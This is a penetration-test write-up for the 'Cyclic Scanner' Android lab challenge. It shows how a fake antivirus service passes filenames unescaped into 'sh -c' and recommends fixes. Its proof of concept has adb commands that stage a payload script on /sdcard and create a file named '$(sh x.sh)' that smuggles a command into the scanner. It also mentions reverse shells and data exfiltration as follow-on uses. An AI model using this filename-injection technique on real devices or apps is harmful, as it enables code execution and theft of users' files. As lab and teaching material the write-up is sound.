# Mobile App Pentest — `com.mobilehackinglab.cyclicscanner` ("Cyclic Scanner")

**Target:** `com.mobilehackinglab.cyclicscanner.apk` — Mobile Hacking Lab "Cyclic Scanner" challenge
**Platform:** Android (minSdk 30, targetSdk 33)
**Basis:** CTF / lab / training
**Date:** 2026-11-02
**Verification:** **Dynamically confirmed on-device.** A file placed on `/sdcard` whose name
carries a shell command-substitution (`$(sh x.sh)`, with the real payload staged in `x.sh`) was
executed by the running `ScanService` within its 6-second scan cycle — the injected command wrote
`/sdcard/pwned.txt` as the scanner's own process. The injection is unconditional in
`ScanEngine.scanFile()`.

---

## Summary

The app is a fake "antivirus" that runs a foreground service (`ScanService`) which, **every 6
seconds**, recursively walks external storage (`/sdcard`) and "scans" every readable file. The scan
is implemented by shelling out to compute a SHA-1 — and it builds that shell command by **string-
concatenating the file's path** into `sh -c`:

```java
// ScanEngine.scanFile(File file)
String command = "toybox sha1sum " + file.getAbsolutePath();
Process process = new ProcessBuilder(new String[0])
        .command("sh", "-c", command)
        .directory(Environment.getExternalStorageDirectory())   // cwd = /sdcard
        .redirectErrorStream(true)
        .start();
```

Because a **file name is attacker-controlled**, any file on shared storage whose name contains shell
metacharacters injects commands into that `sh -c`. The scanner then executes them **in its own
process** — which holds `MANAGE_EXTERNAL_STORAGE` (read/modify *all* user files) and `INTERNET`
(exfiltrate). So a zero-permission app that merely drops a file on shared storage gets **arbitrary
command execution in a privileged process** — a classic confused-deputy / local privilege
escalation. No user interaction beyond the scanner already running.

| ID | Finding | Severity | MASVS |
|----|---------|----------|-------|
| CS-01 | OS command injection — unsanitized filename concatenated into `ProcessBuilder("sh","-c",…)` — **confirmed on-device** | **Critical** | MASVS-CODE-4 / MASVS-PLATFORM-2 |
| CS-02 | Privileged sink: runs as a process holding `MANAGE_EXTERNAL_STORAGE` + `INTERNET` (impact amplifier) | High | MASVS-PLATFORM-1 |
| CS-03 | `android:debuggable="true"` in shipped APK | Medium | MASVS-RESILIENCE-1 |
| CS-04 | `android:allowBackup="true"` (app data extractable via `adb backup`) | Medium | MASVS-STORAGE-2 |

---

## CS-01 — Command injection via crafted filename (Critical)

**Trigger loop** — `ScanService.ServiceHandler.handleMessage()` walks `/sdcard` and calls the sink
for every readable file, re-arming itself every `SCAN_INTERVAL = 6000` ms:
```java
File root = Environment.getExternalStorageDirectory();          // /sdcard
for (File file : FilesKt.walk(root)) {
    if (file.canRead() && file.isFile())
        ScanEngine.INSTANCE.scanFile(file);                     // <-- sink
}
sendMessageDelayed(obtainMessage(), 6000);                      // every 6s, forever
```

**Sink** — the filename goes straight into the shell string (see Summary). The working directory is
set to `/sdcard`, so the injected command also runs relative to shared storage.

### Why it's exploitable
- `file.getAbsolutePath()` for a file on shared storage is `/storage/emulated/0/<name>`, and
  `<name>` is fully attacker-controlled.
- That whole path is placed, unquoted and unescaped, inside `sh -c "toybox sha1sum <path>"`, so
  shell constructs in the name — `` `…` ``, `$(…)`, `;`, `&&` — are interpreted and executed.
- A file name can't contain `/` (and the storage layer rejects a few other characters), so the
  cleanest exploit **stages the real payload in a second file** (whose *contents* may contain any
  characters, including `/`) and uses the crafted name only to invoke it. `cwd=/sdcard` makes the
  invocation a bare relative name.

### Proof of Concept
Assumes the scan service is running (toggle the switch in the app once — note the UI refuses to
turn it back off). Dropping the two files can be done by any app with shared-storage write access,
or via `adb`:
```bash
# 1) payload script — contents may freely contain '/' and redirects
adb shell "echo 'id > /sdcard/pwned.txt' > /sdcard/x.sh"

# 2) trigger file whose NAME injects a command substitution (no '/' in a filename, cwd=/sdcard)
#    NOTE: no backslash before $ — the single quotes already prevent shell expansion;
#    a '\$' would be stored literally in the filename and defeat the substitution.
adb shell "touch '/sdcard/$(sh x.sh)'"

# 3) within ~6s the running scanner hits the trigger file and executes: sh x.sh
adb shell "cat /sdcard/pwned.txt"
```
**Result (confirmed on-device):** within one 6-second scan cycle, `/sdcard/pwned.txt` is created
containing the `id` output of the **scanner app's** process (`uid=…  … com.mobilehackinglab.cyclicscanner`),
proving the command ran inside the scanner's sandbox rather than the caller's. Two reproduction
gotchas: (1) the scan service must be running (toggle it on in the app; the UI won't let you stop
it); (2) write the trigger filename with an un-escaped `$` — a literal backslash (`\$`) gets stored
in the name and defeats the substitution.

From there the payload can do anything the scanner can: read/modify every file on shared storage
(`MANAGE_EXTERNAL_STORAGE`) and exfiltrate over the network (`INTERNET`) — e.g. a reverse shell or
bulk copy of user data. A malicious app achieves this with **no dangerous permissions of its own**;
it only has to place a file where the scanner will walk it.

---

## CS-02 — Privileged, always-on sink
The service is a persistent foreground service the UI won't let the user stop ("Scan service cannot
be stopped, this is for your own safety!"), and it runs as a process granted `MANAGE_EXTERNAL_STORAGE`
and `INTERNET`. That turns CS-01 from "run a command as a sandboxed app" into "run a command as a
process with full storage access and network egress," which is the real severity driver.

## CS-03 / CS-04 — Device-posture weaknesses
- **`debuggable="true"`** → `run-as`/debugger access to app-private data on any device.
- **`allowBackup="true"`** → `adb backup` can pull app-private data off the device.

---

## Root cause & remediation
- **Don't build shell commands by string concatenation, and don't shell out at all here.** Compute
  the hash in-process with `java.security.MessageDigest` (`MessageDigest.getInstance("SHA-1")` over
  the file's bytes). That removes the shell entirely and with it the injection.
- If an external process is ever unavoidable, pass the path as a **separate argv element** (never
  through `sh -c`) and validate/allow-list it: `new ProcessBuilder("toybox","sha1sum", path)` with
  no shell — arguments are not re-parsed by a shell, so metacharacters in the name are inert.
- Reconsider requiring `MANAGE_EXTERNAL_STORAGE`; scoped access dramatically shrinks blast radius.
- Disable `debuggable` and `allowBackup` for release builds.

---

## Appendix — environment & method
- Tools: `unzip`/`7z`, `jadx` (decompile + manifest decode); exploitation reproduced by the user on
  an Android emulator via `adb` (file dropped on `/sdcard`, executed by the running scan service).
- Only three app classes: `MainActivity` (requests `MANAGE_EXTERNAL_STORAGE`, starts the service),
  `scanner/ScanService` (the 6-second walk loop), `scanner/ScanEngine` (the injecting `scanFile`).
  No flag string ships in the APK — the objective is code execution. `KNOWN_MALWARE_SAMPLES` is just
  an EICAR SHA-1 allow/deny list and is not security-relevant to the finding.
